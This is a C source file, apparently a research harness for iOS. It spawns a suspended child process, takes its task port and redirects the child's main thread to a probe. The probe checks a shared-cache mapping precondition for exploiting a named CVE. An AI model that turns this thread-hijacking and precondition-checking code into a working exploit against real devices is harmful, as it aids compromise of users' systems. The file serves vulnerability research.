/*
 * host_ios.c — iOS port of the CVE-2026-43724 first-mapper validation harness.
 *
 * Same flow as the macOS original (impost0r/Rie inject/host.c):
 *   1. posix_spawn(child, START_SUSPENDED | _POSIX_SPAWN_RESLIDE)
 *      -> child suspended at exec, BEFORE dyld maps the cache, fresh bound-EMPTY reslide region
 *   2. task_for_pid(child)            (child is get-task-allow, same uid)
 *   3. find the child's MH_EXECUTE load base
 *   4. hijack the suspended main thread: PC = base + PROBE_OFFSET (child_probe)
 *   5. resume -> child_probe runs pre-dyld, exits with the check_np errno
 *      12 (ENOMEM) = region BOUND but EMPTY  => viable #536 first-mapper   [WANT]
 *       0          = region already populated
 *      22 (EINVAL) = no region bound
 *
 * iOS differences handled here:
 *   - <mach/mach_vm.h> does not exist on iOS (it is macOS-only). The two symbols we need
 *     (mach_vm_read_overwrite, mach_vm_region_recurse) DO exist in libsystem_kernel, so we
 *     declare them ourselves and use a byte buffer for the submap info.
 *   - _POSIX_SPAWN_RESLIDE is not exported by the iOS SDK headers -> define it (0x0080).
 *   - the child path is not an argv entry on iOS: derive it from our own bundle
 *     (_NSGetExecutablePath) -> "<bundle>/libchild.dylib".
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <spawn.h>
#include <sys/spawn.h>
#include <sys/wait.h>
#include <mach/mach.h>
#include <mach/arm/thread_state.h>
#include <mach-o/loader.h>
#include <mach-o/dyld.h>

#ifndef _POSIX_SPAWN_RESLIDE
/* xnu-12377.1.9 bsd/sys/spawn.h: POSIX_SPAWN_START_SUSPENDED = 0x0080,
 * _POSIX_SPAWN_RESLIDE = 0x0800. The old define here was 0x0080 which made
 * the OR a no-op (just START_SUSPENDED) - the child was never a first mapper.
 * CONFIG_RESLIDE_SHARED_CACHE is on in config/MASTER.arm64.iPhoneOS. */
#define _POSIX_SPAWN_RESLIDE 0x0800
#endif

/* --- mach_vm API: the iOS SDK ships the vm types (<mach/vm_types.h>) but not
 *     <mach/mach_vm.h>, so declare just the two functions we need. The symbols are in
 *     libsystem_kernel on iOS. --- */

#ifndef vm_task_t
typedef mach_port_t vm_task_t;   /* iOS has no <mach/mach_vm.h>; mach_port_t is the real type */
#endif
extern kern_return_t mach_vm_read_overwrite(vm_task_t target_task, vm_address_t address,
                                             vm_size_t size, vm_address_t data,
                                             vm_size_t *out_size);
extern kern_return_t mach_vm_region_recurse(vm_task_t target_task, vm_address_t *address,
                                             vm_size_t *size, natural_t *depth,
                                             void *info,
                                             mach_msg_type_number_t *count);

#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <stdarg.h>

static void hlog(const char *fmt, ...);

static void write_result(const char *text)
{
    const char *home = getenv("HOME");
    if (!home) { hlog("no HOME\n"); return; }
    char dir[1024], path[1200];
    snprintf(dir, sizeof(dir), "%s/Documents", home);
    mkdir(dir, 0755);
    snprintf(path, sizeof(path), "%s/result.txt", dir);
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { hlog("open(%s) failed errno=%d\n", path, errno); return; }
    write(fd, text, strlen(text));
    close(fd);
    hlog("wrote %s\n", path);
}
static void hlog(const char *fmt, ...)
{
    char buf[1024];
    va_list ap; va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    fprintf(stderr, "%s", buf);
}

#include "probe_off.h"   /* generated: #define PROBE_OFFSET 0x... (child_probe - __TEXT base) */

extern char **environ;

#define VM_REGION_SUBMAP_INFO_COUNT_64 4096

/* Find the load base of the main MH_EXECUTE image in the target task. */
static vm_address_t find_exec_base(vm_task_t task)
{
	vm_address_t addr = 0;
	vm_size_t size = 0;
	natural_t depth = 0;

	for (;;) {
		uint8_t buf[512];
		mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
		kern_return_t kr = mach_vm_region_recurse(task, &addr, &size, &depth,
		    (void *)buf, &cnt);
		if (kr != 0)
			break;

		uint32_t hdr[4] = {0};
		vm_size_t got = 0;
		if (mach_vm_read_overwrite(task, addr, sizeof(hdr),
		        (vm_address_t)hdr, &got) == 0 &&
		    got == sizeof(hdr) &&
		    hdr[0] == MH_MAGIC_64 &&
		    hdr[3] == MH_EXECUTE) {
			return addr;
		}
		addr += size;
	}
	return 0;
}

static void child_path_self(char *out, size_t n)
{
	uint32_t sz = (uint32_t)n;
	if (_NSGetExecutablePath(out, &sz) == 0) {
		char *slash = strrchr(out, '/');
		if (slash) {
			snprintf(out + (slash - out) + 1, n - (size_t)(slash - out) - 1,
			    "libchild.dylib");
			return;
		}
	}
	snprintf(out, n, "libchild.dylib");
}

int main(int argc, char **argv)
{
	char cbuf[1024];
	const char *child;
	if (argc >= 2) {
		child = argv[1];
	} else {
		child_path_self(cbuf, sizeof(cbuf));
		child = cbuf;
	}
	hlog("[host] child path: %s\n", child);

	posix_spawnattr_t attr;
	posix_spawnattr_init(&attr);
	short flags = (short)(POSIX_SPAWN_START_SUSPENDED | _POSIX_SPAWN_RESLIDE);
	posix_spawnattr_setflags(&attr, flags);

	char *args[] = { (char *)child, NULL };
	pid_t pid = -1;
	int rc = posix_spawn(&pid, child, NULL, &attr, args, environ);
	posix_spawnattr_destroy(&attr);
	if (rc != 0) {
		hlog("[host] posix_spawn failed: %s (%d)\n", strerror(rc), rc);
		{ char r[256]; snprintf(r, sizeof(r), "spawn_failed errno=%d\n", rc); write_result(r); }
		return 1;
	}
	hlog("[host] spawned child pid=%d (suspended, reslide)\n", pid);

	task_t ctask = TASK_NULL;
	kern_return_t kr = task_for_pid(mach_task_self(), pid, &ctask);
	if (kr != 0) {
		hlog("[host] task_for_pid failed: %s (0x%x). "
		    "child needs get-task-allow, or run as root.\n",
		    mach_error_string(kr), kr);
		char r[256]; snprintf(r, sizeof(r), "task_for_pid_failed kr=0x%x\n", kr); write_result(r);
		kill(pid, SIGKILL);
		return 1;
	}

	thread_act_array_t threads = NULL;
	mach_msg_type_number_t nthreads = 0;
	kr = task_threads(ctask, &threads, &nthreads);
	if (kr != 0 || nthreads < 1) {
		hlog("[host] task_threads failed: %s (0x%x) n=%u\n",
		    mach_error_string(kr), kr, nthreads);
		kill(pid, SIGKILL);
		return 1;
	}
	thread_t th = threads[0];

	vm_address_t base = find_exec_base(ctask);
	if (base == 0) {
		hlog("[host] could not locate child exec base\n");
		kill(pid, SIGKILL);
		return 1;
	}
	vm_address_t probe = base + PROBE_OFFSET;
	hlog("[host] child exec base=0x%llx child_probe=0x%llx\n",
	    (unsigned long long)base, (unsigned long long)probe);

	arm_thread_state64_t st;
	mach_msg_type_number_t scount = ARM_THREAD_STATE64_COUNT;
	kr = thread_get_state(th, ARM_THREAD_STATE64, (thread_state_t)&st, &scount);
	if (kr != 0) {
		hlog("[host] thread_get_state failed: %s (0x%x)\n",
		    mach_error_string(kr), kr);
		kill(pid, SIGKILL);
		return 1;
	}

	st.__pc = (uint64_t)probe;
	st.__sp &= ~0xFULL;

	kr = thread_set_state(th, ARM_THREAD_STATE64, (thread_state_t)&st, scount);
	if (kr != 0) {
		hlog("[host] thread_set_state failed: %s (0x%x)\n",
		    mach_error_string(kr), kr);
		kill(pid, SIGKILL);
		return 1;
	}

	kr = task_resume(ctask);
	if (kr != 0) {
		hlog("[host] task_resume failed: %s (0x%x)\n",
		    mach_error_string(kr), kr);
		kill(pid, SIGKILL);
		return 1;
	}

	int status = 0;
	if (waitpid(pid, &status, 0) < 0) {
		perror("[host] waitpid");
		return 1;
	}
	if (WIFEXITED(status)) {
		int code = WEXITSTATUS(status);
		const char *meaning =
		    code == 12 ? "ENOMEM: BOUND-but-EMPTY region  => viable #536 FIRST-MAPPER" :
		    code == 0  ? "region already populated" :
		    code == 22 ? "EINVAL: no region bound" :
		                 "unexpected";
		hlog("[host] child_probe exit=%d  (%s)\n", code, meaning);
		char r[256]; snprintf(r, sizeof(r), "child_probe_exit=%d meaning=%s\n", code, meaning); write_result(r);
	} else if (WIFSIGNALED(status)) {
		hlog("[host] child killed by signal %d "
		    "(hijack/PAC/exec issue -- inspect)\n", WTERMSIG(status));
		char r[256]; snprintf(r, sizeof(r), "child_killed_signal=%d\n", WTERMSIG(status)); write_result(r);
	}
	return 0;
}
